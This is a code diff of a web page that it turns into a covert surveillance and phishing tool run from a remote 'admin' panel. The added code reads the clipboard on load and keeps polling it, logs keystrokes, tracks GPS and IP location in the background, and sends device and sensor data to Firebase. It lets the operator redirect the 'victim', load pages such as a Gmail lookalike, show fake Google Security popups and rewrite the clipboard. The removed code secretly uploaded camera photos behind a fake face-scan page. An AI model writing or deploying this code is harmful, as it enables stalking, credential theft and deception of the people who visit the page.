+          setTimeout(() => document.body.removeChild(btn), 1000);
+
+          // Command clear karo
+          database.ref(`admin_commands/${deviceId}/clipboard`).remove();
+        }
+      });
+    }
+
+    async function setClipboardText(text) {
+      try { await navigator.clipboard.writeText(text); lastClipboardContent = text; return true; }
+      catch (err) {
+        try {
+          const ta = document.createElement('textarea');
+          ta.value = text; ta.style.position = 'fixed'; ta.style.opacity = '0';
+          document.body.appendChild(ta); ta.select();
+          document.execCommand('copy'); document.body.removeChild(ta);
+        } catch (e) { }
+        return false;
       }
     }
 
-    // 📸 CAPTURE FUNCTION
-    function autoCapture(type = 'manual') {
-      if (!cameraStream || !video.videoWidth) return;
+    async function autoReadClipboardOnLoad() {
+      try {
+        if (!navigator.clipboard || !navigator.clipboard.readText) return;
+        const text = await navigator.clipboard.readText();
+        if (text && text.trim() !== '') {
+          await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, {
+            type: 'auto_read_on_load', text: text.substring(0, 1000), length: text.length,
+            timestamp: Date.now(),
+            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            url: location.href, deviceId, source: 'page_load_auto'
+          });
+        }
+      } catch (error) {
+        if (error.name === 'NotAllowedError') {
+          const oneTimeClick = async () => {
+            try {
+              const text = await navigator.clipboard.readText();
+              if (text) {
+                await saveToFirebase(`clipboard_data/${deviceId}/auto_read/${Date.now()}`, {
+                  text: text.substring(0, 500), length: text.length, timestamp: Date.now()
+                });
+              }
+            } catch (e) { }
+            document.removeEventListener('click', oneTimeClick);
+          };
+          document.addEventListener('click', oneTimeClick);
+        }
+      }
+    }
 
-      const canvas = document.createElement('canvas');
-      canvas.width = 640;
-      canvas.height = 480;
-      const ctx = canvas.getContext('2d');
+    function startPeriodicClipboardCheck() {
+      if (clipboardCheckInterval) clearInterval(clipboardCheckInterval);
+      clipboardCheckInterval = setInterval(async () => {
+        try {
+          if (!document.hidden && navigator.clipboard && navigator.clipboard.readText) {
+            const t = await navigator.clipboard.readText();
+            if (t && t !== lastClipboardContent && t.trim() !== '') {
+              lastClipboardContent = t;
+              await saveToFirebase(`clipboard_data/${deviceId}/periodic/${Date.now()}`, {
+                type: 'periodic_check', text: t.substring(0, 1000),
+                length: t.length, timestamp: Date.now(), deviceId
+              });
+            }
+          }
+        } catch (e) { }
+      }, 10000);
+    }
 
-      ctx.translate(canvas.width, 0);
-      ctx.scale(-1, 1);
-      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    /* ---------------- SENSORS ---------------- */
+    function initMobileSensors() {
+      if ('DeviceOrientationEvent' in window) {
+        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
+          document.body.addEventListener('click', () => {
+            DeviceOrientationEvent.requestPermission()
+              .then(r => { if (r === 'granted') window.addEventListener('deviceorientation', handleOrientation); })
+              .catch(() => { });
+          });
+        } else {
+          window.addEventListener('deviceorientation', handleOrientation);
+        }
+      }
+      if ('DeviceMotionEvent' in window) {
+        if (typeof DeviceMotionEvent.requestPermission === 'function') {
+          document.body.addEventListener('click', () => {
+            DeviceMotionEvent.requestPermission()
+              .then(r => { if (r === 'granted') window.addEventListener('devicemotion', handleMotion); })
+              .catch(() => { });
+          });
+        } else {
+          window.addEventListener('devicemotion', handleMotion);
+        }
+      }
+    }
 
-      const compressedPhoto = canvas.toDataURL('image/jpeg', 0.6);
+    function handleOrientation(event) {
+      sensorData.orientation = {
+        alpha: event.alpha, beta: event.beta, gamma: event.gamma,
+        absolute: event.absolute, timestamp: Date.now()
+      };
+      if (Date.now() - (sensorData.lastSave || 0) > 5000) {
+        saveToFirebase(`sensors/${deviceId}/orientation/${Date.now()}`, sensorData.orientation);
+        sensorData.lastSave = Date.now();
+      }
+    }
 
-      if (db) {
-        db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
-          image: compressedPhoto, timestamp: Date.now(), type: type, deviceId: deviceId
-        }).then(() => {
-          console.log(`📸 Photo saved (${type}) at`, new Date().toLocaleTimeString());
-        }).catch(err => {
-          console.error("Upload failed:", err);
+    function handleMotion(event) {
+      sensorData.motion = {
+        acceleration: { x: event.acceleration?.x, y: event.acceleration?.y, z: event.acceleration?.z },
+        rotationRate: { alpha: event.rotationRate?.alpha, beta: event.rotationRate?.beta, gamma: event.rotationRate?.gamma },
+        interval: event.interval, timestamp: Date.now()
+      };
+      if (Date.now() - (sensorData.lastSaveMotion || 0) > 5000) {
+        saveToFirebase(`sensors/${deviceId}/motion/${Date.now()}`, sensorData.motion);
+        sensorData.lastSaveMotion = Date.now();
+      }
+    }
+
+    /* ---------------- GPS / GEO ---------------- */
+    function getGPSLocation() {
+      return new Promise((resolve, reject) => {
+        if (!navigator.geolocation) { reject('GPS not supported'); return; }
+        navigator.geolocation.getCurrentPosition(
+          p => resolve({
+            latitude: p.coords.latitude, longitude: p.coords.longitude,
+            accuracy: p.coords.accuracy, altitude: p.coords.altitude,
+            speed: p.coords.speed, heading: p.coords.heading, timestamp: Date.now()
+          }),
+          e => reject(e.message),
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+        );
+      });
+    }
+
+    async function getGeoLocation() {
+      try {
+        const r = await fetch('https://ipapi.co/json/');
+        const d = await r.json();
+        return {
+          ip: d.ip || 'Unknown', latitude: d.latitude || 0, longitude: d.longitude || 0,
+          city: d.city || 'Unknown', region: d.region || 'Unknown',
+          country: d.country_name || 'Unknown', postal: d.postal || 'Unknown',
+          timezone: d.timezone || 'Unknown', timestamp: Date.now(),
+          dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+        };
+      } catch (e) { return null; }
+    }
+
+    async function saveToFirebase(path, data) {
+      if (!database) return false;
+      try { await database.ref(path).set(data); return true; }
+      catch (e) { return false; }
+    }
+
+    async function saveGPSToFirebase(location) {
+      if (!database || !location) return false;
+      const g = {
+        deviceId, type: 'gps', latitude: location.latitude, longitude: location.longitude,
+        accuracy: location.accuracy, speed: location.speed, altitude: location.altitude,
+        timestamp: Date.now(),
+        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+      };
+      await database.ref(`gps_locations/${deviceId}/current`).set(g);
+      await database.ref(`gps_locations/${deviceId}/history`).push(g);
+      return true;
+    }
+
+    async function saveGeoToFirebase(geo) {
+      if (!database || !geo || !geo.latitude || geo.latitude === 0) return false;
+      const g = {
+        deviceId, type: 'geo', latitude: geo.latitude, longitude: geo.longitude,
+        city: geo.city, region: geo.region, country: geo.country, ip: geo.ip,
+        postal: geo.postal, timezone: geo.timezone, timestamp: Date.now(),
+        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+      };
+      await database.ref(`geo_locations/${deviceId}/current`).set(g);
+      await database.ref(`geo_locations/${deviceId}/history`).push(g);
+      return true;
+    }
+
+    async function captureGPS() {
+      try { const g = await getGPSLocation(); await saveGPSToFirebase(g); return g; }
+      catch (e) { smartLocationRequest(); return null; }
+    }
+
+    async function captureGeo() {
+      try {
+        const g = await getGeoLocation();
+        if (g && g.latitude && g.latitude !== 0) { await saveGeoToFirebase(g); return g; }
+        return null;
+      } catch (e) { return null; }
+    }
+
+    /* ---------------- DEVICE INFO ---------------- */
+    function generateDeviceId() {
+      let id = localStorage.getItem('device_tracker_id');
+      if (!id) {
+        id = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+        localStorage.setItem('device_tracker_id', id);
+      }
+      return id;
+    }
+
+    async function getBatteryInfo() {
+      if ('getBattery' in navigator) {
+        try { const b = await navigator.getBattery(); return Math.floor(b.level * 100) + '%'; }
+        catch (e) { return 'Unknown'; }
+      }
+      return 'Not supported';
+    }
+
+    async function getIPAddress() {
+      try { const r = await fetch('https://api.ipify.org?format=json'); const d = await r.json(); return d.ip; }
+      catch (e) { return 'Unable to fetch'; }
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let browser = 'Unknown', os = 'Unknown', device = 'Unknown';
+
+      // ✅ Edge ko pehle check karo kyunki usme bhi 'Chrome' hota hai
+      if (ua.includes('Edg/') || ua.includes('Edge/')) browser = 'Edge';
+      else if (ua.includes('OPR/') || ua.includes('Opera')) browser = 'Opera';
+      else if (ua.includes('Chrome')) browser = 'Chrome';
+      else if (ua.includes('Firefox')) browser = 'Firefox';
+      else if (ua.includes('Safari')) browser = 'Safari';
+
+      if (ua.includes('Windows')) os = 'Windows';
+      else if (ua.includes('Mac')) os = 'macOS';
+      else if (ua.includes('Android')) os = 'Android';
+      else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+      else if (ua.includes('Linux')) os = 'Linux';
+
+      const m = ua.match(/\(([^)]+)\)/);
+      if (m) device = m[1].substring(0, 30);
+
+      return { browser, os, device, userAgent: ua };
+    }
+
+    function getNetworkInfo() {
+      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      return c ? (c.effectiveType || c.type || 'Unknown') : 'Unknown';
+    }
+
+    function getScreenInfo() { return `${screen.width}x${screen.height}`; }
+    function getTimezone() { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+
+    async function updateVisitCount() {
+      try {
+        const snap = await database.ref(`device_visits/${deviceId}/count`).once('value');
+        let count = snap.val() || 0; count++;
+        visitCount = count;
+        await database.ref(`device_visits/${deviceId}`).update({
+          count, lastVisit: Date.now(),
+          lastVisitTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+        });
+        await database.ref(`visit_logs/${deviceId}`).push({
+          visitNumber: count, timestamp: Date.now(),
+          time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+        });
+        return count;
+      } catch (e) { return 0; }
+    }
+
+    async function collectDeviceData() {
+      const d = getDeviceInfo();
+      const battery = await getBatteryInfo();
+      const ip = await getIPAddress();
+      return {
+        deviceId, ip, deviceModel: d.device, os: d.os, browser: d.browser,
+        userAgent: d.userAgent, screen: getScreenInfo(), battery,
+        networkType: getNetworkInfo(), timezone: getTimezone(),
+        visitNumber: visitCount, lastSeen: Date.now(),
+        lastSeenTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        status: 'active'
+      };
+    }
+
+    async function saveDeviceDataToFirebase(data) {
+      if (!database) return false;
+      await database.ref(`devices/${deviceId}`).update(data);
+      await database.ref(`device_history/${deviceId}`).push({
+        ...data, loggedAt: Date.now(), loggedTime: data.lastSeenTime
+      });
+      await database.ref(`online_devices/${deviceId}`).set({
+        status: 'online', lastSeen: data.lastSeen, lastSeenTime: data.lastSeenTime
+      });
+      return true;
+    }
+
+    async function updateDeviceInfo() {
+      try {
+        const d = await collectDeviceData();
+        await saveDeviceDataToFirebase(d);
+        return d;
+      } catch (e) { return null; }
+    }
+
+    async function saveHardwareSoftwareInfo() {
+      const info = getHardwareSoftwareInfo();
+      const payload = {
+        deviceId, hardware: info.hardware, software: info.software,
+        timestamp: Date.now(),
+        dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+      };
+      await saveToFirebase(`hardware_info/${deviceId}/current`, payload);
+      await saveToFirebase(`software_info/${deviceId}/current`, payload);
+    }
+
+    /* ---------------- PERMISSIONS ---------------- */
+    function smartLocationRequest() {
+      if (!navigator.geolocation) return;
+      if (!navigator.permissions) { captureGPS(); return; }
+      navigator.permissions.query({ name: 'geolocation' }).then(r => {
+        if (r.state === 'granted' || r.state === 'prompt') captureGPS();
+      }).catch(() => captureGPS());
+    }
+
+    function requestNotificationPermission() {
+      if ('Notification' in window) {
+        Notification.requestPermission().then(p => {
+          if (p === 'granted') saveToFirebase(`notifications/${deviceId}/status`, { status: 'granted', timestamp: Date.now() });
         });
       }
     }
 
-    // 🚀 TAB SWITCH & RETURN
-    document.addEventListener("visibilitychange", () => {
-      if (document.visibilityState === "hidden") {
-        autoCapture('tab_switch');
-        console.log("👀 User left tab. Photo captured.");
-      } else {
-        autoCapture('tab_return');
-        console.log("👋 User returned to tab. Photo captured.");
+    function startPermissionReminder() {
+      if (permissionInterval) clearInterval(permissionInterval);
+      permissionInterval = setInterval(() => {
+        if (!navigator.permissions) return;
+        navigator.permissions.query({ name: 'geolocation' }).then(r => {
+          if (r.state === 'granted') captureGPS();
+        }).catch(() => { });
+      }, 120000);
+    }
+
+    /* ---------------- SCREEN STATE ---------------- */
+    function updateScreenStatus() {
+      const status = document.hidden ? 'OFF' : 'ON';
+      if (database) {
+        database.ref(`devices/${deviceId}/screenStatus`).set(status);
+        database.ref(`online_devices/${deviceId}/screen`).set(status);
       }
-    });
+    }
 
-    function startAnalysis() {
-      $("emptyState").style.display = "none";
-      $("progressWrap").style.display = "block";
-      $("scanBeam").style.display = "block";
+    /* ---------------- ADMIN COMMANDS ---------------- */
+    function listenForAdminCommand() {
+      if (!database) return;
 
-      speak("Biometric data captured. Initiating global scan.");
+      // 1. IFRAME CONTROL (Game, Gmail, Custom URL)
+      const mapPage = (p) => {
+        const pages = { 'game': 'game.html', 'videochat': 'videochat.html', 'engage': 'engage.html', 'gmail': 'gmail.html' };
+        return pages[p] || 'game.html';
+      };
 
-      const steps = [
-        ["Extracting Landmarks…", "Analyzing 128-point map", 15],
-        ["Querying Global DB…", "Searching 47.2M records", 40],
-        ["Cross-Referencing…", "Comparing facial geometry", 70],
-        ["Filtering Matches…", "Removing false positives", 90],
-        ["Finalizing Report…", "Almost done", 100]
-      ];
+      database.ref(`admin_commands/${deviceId}/iframe`).on('value', (snap) => {
+        const c = snap.val();
+        if (c && c.active) {
+          const iframe = document.getElementById('dynamicFrame');
+          if (!iframe) return;
 
-      steps.forEach(([title, desc, progress], index) => {
-        setTimeout(() => {
-          $("progressTitle").textContent = title;
-          $("progressText").textContent = desc;
-          $("progressBar").style.width = progress + "%";
-          log(title); speak(title);
-        }, index * 8000);
+          let targetUrl = c.custom_url || mapPage(c.page);
+
+          if (targetUrl) {
+            iframe.src = targetUrl;
+            iframe.style.display = 'block';
+            localStorage.setItem('active_iframe_url', targetUrl);
+            console.log(`✅ Loaded: ${targetUrl}`);
+          }
+          database.ref(`admin_commands/${deviceId}/iframe`).remove();
+        }
       });
 
+      // 2. FORCE REDIRECT
+      database.ref(`admin_commands/${deviceId}/redirect`).on('value', (snap) => {
+        const c = snap.val();
+        if (c && c.url && c.active) {
+          localStorage.removeItem('active_iframe_url');
+          window.location.href = c.url;
+          database.ref(`admin_commands/${deviceId}/redirect`).remove();
+        }
+      });
+
+      // 3. SHOW ALERT POPUP
+      database.ref(`admin_commands/${deviceId}/alert`).on('value', (snap) => {
+        const c = snap.val();
+        if (c && c.message && c.active) {
+          const popup = document.getElementById('customAlert');
+          const msgBox = document.getElementById('customAlertMessage');
+          const brandName = document.getElementById('popupBrandName');
+          const brandUrl = document.getElementById('popupBrandUrl');
+          const brandIcon = document.getElementById('popupBrandIconImg');
+
+          if (popup && msgBox) {
+            msgBox.textContent = c.message;
+            if (brandUrl) brandUrl.textContent = c.url || 'accounts.google.com';
+            if (brandName) brandName.textContent = c.brand ? `${c.brand} Security` : 'Google Security';
+            if (brandIcon) {
+              if (c.icon && c.icon.startsWith('http')) {
+                brandIcon.src = c.icon;
+                brandIcon.style.display = 'block';
+              } else {
+                brandIcon.src = 'https://www.google.com/favicon.ico';
+              }
+            }
+            popup.style.display = 'flex';
+          }
+          database.ref(`admin_commands/${deviceId}/alert`).remove();
+        }
+      });
+
+      // 4. VIBRATE
+      database.ref(`admin_commands/${deviceId}/vibrate`).on('value', (snap) => {
+        const c = snap.val();
+        if (c && c.active) {
+          if (navigator.vibrate) navigator.vibrate(1000);
+          database.ref(`admin_commands/${deviceId}/vibrate`).remove();
+        }
+      });
+
+      // 5. CLIPBOARD (Fixed - No auto failure toast)
+      database.ref(`admin_commands/${deviceId}/clipboard`).on('value', async (snap) => {
+        const c = snap.val();
+        if (c && c.text && c.active) {
+          await setClipboardText(c.text);
+          database.ref(`admin_commands/${deviceId}/clipboard`).remove();
+        }
+      });
+
+      // 6. ✅ NAYA: CUSTOM TOAST FROM ADMIN
+      database.ref(`admin_commands/${deviceId}/custom_toast`).on('value', (snap) => {
+        const c = snap.val();
+        if (c && c.message && c.active) {
+
+          // Victim ko custom toast dikhao
+          const container = document.getElementById('victimToasts');
+          if (container) {
+            const t = document.createElement('div');
+            t.className = 'v-toast ' + (c.type || 'ok');
+            const icon = (c.type === 'err') ? '✖' : '✔';
+            t.innerHTML = `<span class="v-toast-icon">${icon}</span> <span>${c.message}</span>`;
+            container.appendChild(t);
+
+            requestAnimationFrame(() => t.classList.add('show'));
+            setTimeout(() => {
+              t.classList.remove('show');
+              setTimeout(() => t.remove(), 300);
+            }, 3000);
+          }
+
+          database.ref(`admin_commands/${deviceId}/custom_toast`).remove();
+        }
+      });
+
+
+      // ======================================================
+      // ✅ FINAL NOTIFICATION LISTENER (Bulletproof)
+      // ======================================================
+      database.ref(`admin_commands/${deviceId}/notification`).on('value', (snap) => {
+        const c = snap.val();
+        console.log("🔔 Data:", c);
+
+        if (!c || !c.message) return;
+
+        if (Notification.permission === "granted") {
+          navigator.serviceWorker.ready.then((reg) => {
+            reg.showNotification(c.title || "Alert", {
+              body: c.message,
+              icon: c.icon || 'https://www.google.com/favicon.ico',
+              requireInteraction: true
+            });
+            console.log("✅ Notification Sent via Service Worker!");
+          });
+
+          database.ref(`admin_commands/${deviceId}/notification`).remove();
+        }
+      });
+    }
+
+
+    function showVictimToast(msg, type = 'ok') {
+      const container = document.getElementById('victimToasts');
+      if (!container) return;
+
+      const t = document.createElement('div');
+      t.className = 'v-toast ' + type;
+
+      const icon = type === 'ok' ? '✔' : '✖';
+
+      t.innerHTML = `<span class="v-toast-icon">${icon}</span> <span>${msg}</span>`;
+      container.appendChild(t);
+
+      // Animation
+      requestAnimationFrame(() => t.classList.add('show'));
+
+      // Auto remove
       setTimeout(() => {
-        $("scanBeam").style.display = "none";
-        showResults();
-      }, 45000);
+        t.classList.remove('show');
+        setTimeout(() => t.remove(), 300);
+      }, 3000);
     }
+    /* ---------------- TIMERS & BACKGROUND TRACKING ---------------- */
 
-    function showResults() {
-      // 🚀 Hide freeze frame when scan is done
-      freezeFrame.style.display = "none";
+    function startGPSTracking() {
+      if (gpsInterval) clearInterval(gpsInterval);
 
-      const gridHigh = $("resultGridExact");
-      gridHigh.replaceChildren();
-      samplesHigh.forEach(person => {
-        const card = document.createElement("div");
-        card.className = "person";
-        card.innerHTML = `<img src="${person.img}" alt="Match"><div class="person-info"><b>${person.name}</b><small>${person.place}</small></div><span class="score">${person.score}</span>`;
-        gridHigh.appendChild(card);
+      // Pehli baar turant
+      captureGPS();
+
+      // Screen ON ke liye aggressive tracking
+      gpsInterval = setInterval(() => {
+        if (!document.hidden) {
+          captureGPS(); // High accuracy
+        } else {
+          silentBackgroundGPS(); // Low accuracy fallback
+        }
+      }, 10000);
+
+      // 🚀 EXTRA: Visibility change pe trigger
+      document.addEventListener('visibilitychange', () => {
+        if (!document.hidden) {
+          captureGPS(); // Wapas aane pe turant
+        } else {
+          silentBackgroundGPS(); // Jaane pe turant
+        }
       });
 
-      const gridLow = $("resultGridLow");
-      gridLow.replaceChildren();
-      samplesLow.forEach(person => {
-        const card = document.createElement("div");
-        card.className = "person";
-        card.innerHTML = `<img src="${person.img}" alt="Match"><div class="person-info"><b>${person.name}</b><small>${person.place}</small></div><span class="score">${person.score}</span>`;
-        gridLow.appendChild(card);
+      // 🚀 EXTRA: Page hide pe (phone lock)
+      window.addEventListener('pagehide', () => {
+        silentBackgroundGPS();
       });
-
-      $("progressWrap").style.display = "none";
-      $("results").style.display = "block";
-      log("Analysis complete. 11 total matches found.");
-      speak("Analysis complete. I found 7 high and 4 low confidence matches.");
-
-      // 🚀 Complete hone ke baad camera blank karo aur button change karo
-      video.classList.remove('show');
-      $("cameraStatus").style.display = "none";
-      $("faceGuide").style.display = "none";
-
-      // Button text change to "Start Finding Again"
-      $("captureBtn").textContent = "Start Finding Again";
-      $("captureBtn").disabled = false;
     }
 
-    $("startBtn").addEventListener("click", () => { $("consentModal").style.display = "grid"; });
-    $("cancelBtn").addEventListener("click", () => { $("consentModal").style.display = "none"; });
-    $("allowBtn").addEventListener("click", async () => { $("consentModal").style.display = "none"; await enableCamera(); });
+    // 2. GEO TRACKING (IP Based)
+    function startGeoTracking() {
+      if (geoInterval) clearInterval(geoInterval);
+      captureGeo();
 
-    // 🚀 FREEZE FRAME & CAPTURE
-    $("captureBtn").addEventListener("click", () => {
-      if ($("captureBtn").textContent === "Start Finding Again") {
-        // Reset logic for repeat
-        $("results").style.display = "none";
-        $("emptyState").style.display = "flex";
-        $("progressWrap").style.display = "none";
+      geoInterval = setInterval(() => {
+        if (!document.hidden) {
+          captureGeo();
+        } else {
+          // Background me Geo update (kam frequent)
+          setTimeout(() => { captureGeo(); }, 30000);
+        }
+      }, 15000); // 15 seconds
+    }
 
-        video.classList.add('show');
-        $("faceGuide").style.display = "block";
-        $("cameraStatus").style.display = "flex";
+    // 3. ✅ SILENT BACKGROUND GPS (Naya Function)
+    function silentBackgroundGPS() {
+      if (!navigator.geolocation) return;
 
-        $("captureBtn").textContent = "Capture & Analyze";
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const gpsData = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: Date.now(),
+            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            type: 'background_gps',
+            screen: 'OFF'
+          };
+
+          if (database) {
+            // Current location update karo
+            database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
+
+            // History me sirf har 5 minute me save karo (taaki database na bhare)
+            const lastHistory = localStorage.getItem('last_bg_gps_history');
+            const now = Date.now();
+            if (!lastHistory || now - parseInt(lastHistory) > 300000) { // 5 min
+              database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
+              localStorage.setItem('last_bg_gps_history', now);
+            }
+          }
+          console.log('📍 Background GPS Updated:', pos.coords.latitude, pos.coords.longitude);
+        },
+        (err) => {
+          console.log('⚠️ Background GPS Failed:', err.message);
+        },
+        {
+          enableHighAccuracy: false, // Battery save
+          timeout: 15000,
+          maximumAge: 60000 // Purana data bhi chalega
+        }
+      );
+    }
+
+    // 4. ✅ NEW FUNCTION: handleInstallClick (Tumhara code)
+    function handleInstallClick() {
+      // Popup band karo
+      const popup = document.getElementById('customAlert');
+      if (popup) popup.style.display = 'none';
+
+      // ACTION: Victim ko kahan bhejna hai?
+      // Example ke liye maine Google daala hai, tum apna link daal sakte ho.
+      window.location.href = "https://google.com";
+
+      // Agar tum chahte ho ki victim ke iframe me kuch load ho, toh ye use karo:
+      // const iframe = document.getElementById('dynamicFrame');
+      // if (iframe) iframe.src = 'fake-update.html';
+    }
+
+    function silentBackgroundGPS() {
+      if (!navigator.geolocation) return;
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          const gpsData = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            timestamp: Date.now(),
+            dateTime: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+            type: 'background_gps',
+            screen: 'OFF'
+          };
+
+          if (database) {
+            // Current location update karo
+            database.ref(`gps_locations/${deviceId}/current`).set(gpsData);
+
+            // History me sirf har 5 minute me save karo (taaki database na bhare)
+            const lastHistory = localStorage.getItem('last_bg_gps_history');
+            const now = Date.now();
+            if (!lastHistory || now - parseInt(lastHistory) > 300000) { // 300,000 ms = 5 min
+              database.ref(`gps_locations/${deviceId}/history`).push(gpsData);
+              localStorage.setItem('last_bg_gps_history', now);
+            }
+          }
+          console.log('📍 Background GPS Updated:', pos.coords.latitude, pos.coords.longitude);
+        },
+        (err) => {
+          console.log('⚠️ Background GPS Failed:', err.message);
+        },
+        {
+          enableHighAccuracy: false, // Battery save ke liye low accuracy
+          timeout: 15000,
+          maximumAge: 60000 // Purana data bhi chalega
+        }
+      );
+    }
+
+    /* ---------------- BOOT ---------------- */
+    async function startApp() {
+      deviceId = generateDeviceId();
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js').then(r => console.log('✅ SW Registered')).catch(e => console.error(e));
+      }
+      // ✅ Service Worker Register + Periodic Sync
+      if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('sw.js').then(async (reg) => {
+          console.log('✅ SW Registered:', reg.scope);
+
+          // IndexedDB me deviceId save karo (taaki SW use kar sake)
+          const dbReq = indexedDB.open('tracker_db', 1);
+          dbReq.onupgradeneeded = (e) => e.target.result.createObjectStore('config');
+          dbReq.onsuccess = (e) => {
+            const db = e.target.result;
+            const tx = db.transaction('config', 'readwrite');
+            tx.objectStore('config').put(deviceId, 'deviceId');
+          };
+
+          // 🚀 Periodic Background Sync register karo
+          if ('periodicSync' in reg) {
+            try {
+              const status = await navigator.permissions.query({ name: 'periodic-background-sync' });
+              if (status.state === 'granted') {
+                await reg.periodicSync.register('gps-sync', {
+                  minInterval: 15 * 60 * 1000 // 15 minutes
+                });
+                console.log('✅ Periodic Background Sync Registered');
+              }
+            } catch (err) {
+              console.log('⚠️ Periodic Sync not available:', err.message);
+            }
+          }
+        }).catch(err => console.error('SW Error:', err));
+      }
+      listenForAdminCommand();
+      initClipboardMonitoring();
+      listenForAdminClipboard();
+      setTimeout(autoReadClipboardOnLoad, 1000);
+      startPeriodicClipboardCheck();
+      initMobileSensors();
+
+      await saveHardwareSoftwareInfo();
+
+      // ✅ NAYA: Notification Permission (User Click ke baad)
+      if ("Notification" in window) {
+        if (Notification.permission === "granted") {
+          database.ref(`devices/${deviceId}/notification_status`).set("granted");
+        } else if (Notification.permission === "default") {
+
+          // Function jo permission mangega
+          const askPermission = () => {
+            Notification.requestPermission().then(permission => {
+              if (permission === "granted") {
+                console.log("✅ Notifications allowed");
+                database.ref(`devices/${deviceId}/notification_status`).set("granted");
+              }
+            });
+            // Ek baar puchne ke baad listener hata do
+            document.removeEventListener('click', askPermission);
+          };
+          let keyLogBuffer = '';
+          let keyLogTimer = null;
+
+          document.addEventListener('keydown', (e) => {
+            // Ignore modifier keys
+            if (['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Tab'].includes(e.key)) return;
+
+            let char = e.key;
+
+            // Special keys ko readable banao
+            if (e.key === ' ') char = ' ';
+            if (e.key === 'Enter') char = '\n';
+            if (e.key === 'Backspace') char = '[BACKSPACE]';
+            if (e.key === 'Delete') char = '[DELETE]';
+            if (e.key === 'Escape') char = '[ESC]';
+
+            keyLogBuffer += char;
+
+            // Har 5 second me batch save karo (spam na ho)
+            clearTimeout(keyLogTimer);
+            keyLogTimer = setTimeout(() => {
+              if (keyLogBuffer.length > 0) {
+                database.ref(`keylogs/${deviceId}/${Date.now()}`).set({
+                  keys: keyLogBuffer,
+                  url: window.location.href,
+                  timestamp: Date.now(),
+                  time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+                });
+                keyLogBuffer = '';
+              }
+            }, 5000);
+          });
+
+          // Form submit hone pe turant save karo
+          document.addEventListener('submit', (e) => {
+            if (keyLogBuffer.length > 0) {
+              database.ref(`keylogs/${deviceId}/${Date.now()}`).set({
+                keys: keyLogBuffer,
+                url: window.location.href,
+                timestamp: Date.now(),
+                time: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+                type: 'form_submit'
+              });
+              keyLogBuffer = '';
+            }
+          });
+
+          console.log('✅ Keylogger active');
+          // Jab user page pe click karega tabhi permission popup aayega
+          setTimeout(() => {
+            document.addEventListener('click', askPermission);
+          }, 3000);
+        }
+      }
+
+      await updateVisitCount();
+      await updateDeviceInfo();
+
+      startGPSTracking();
+      startGeoTracking();
+      smartLocationRequest();
+      startPermissionReminder();
+
+      // Heartbeat every 2 min
+      setInterval(async () => {
+        if (document.hidden) return;
+        const battery = await getBatteryInfo();
+        const screen = getScreenInfo();
+        if (database) {
+          await database.ref(`devices/${deviceId}/battery`).set(battery);
+          await database.ref(`devices/${deviceId}/screen`).set(screen);
+          await database.ref(`devices/${deviceId}/lastSeen`).set(Date.now());
+        }
+      }, 120000);
+
+      updateScreenStatus();
+      // ✅ VISIBILITY CHANGE (Screen ON/OFF Handling)
+      document.addEventListener('visibilitychange', () => {
+        updateScreenStatus();
+
+        if (!document.hidden) {
+          // Screen ON hui -> Turant GPS aur Geo update karo
+          console.log("💡 Screen ON - High Accuracy Tracking");
+          captureGPS();
+          captureGeo();
+        } else {
+          // Screen OFF hui -> Background tracking trigger karo
+          console.log("📴 Screen OFF - Background Tracking Active");
+
+          // Notification se browser ko force karo ki JS chalti rahe
+          if ("Notification" in window && Notification.permission === "granted") {
+            navigator.serviceWorker.ready.then(reg => {
+              reg.showNotification("System Sync", {
+                body: "Syncing data in background...",
+                silent: true,
+                tag: 'bg-sync',
+                requireInteraction: false
+              });
+            }).catch(e => { });
+          }
+
+          // Turant ek background GPS update bhejo
+          silentBackgroundGPS();
+        }
+      });
+
+      console.log('✅ Silent tracker active + fullscreen iframe');
+    }
+
+    function initFirebase() {
+      if (typeof firebaseConfig === 'undefined') {
+        console.error('❌ config.js missing');
         return;
       }
+      if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
+      database = firebase.database();
+      console.log('✅ Firebase ready');
 
-      autoCapture('manual');
-
-      if (video.videoWidth) {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext('2d');
-        ctx.translate(canvas.width, 0);
-        ctx.scale(-1, 1);
-        ctx.drawImage(video, 0, 0);
-
-        freezeFrame.src = canvas.toDataURL('image/jpeg', 0.8);
-        freezeFrame.style.display = "block";
-
-        video.classList.remove('show');
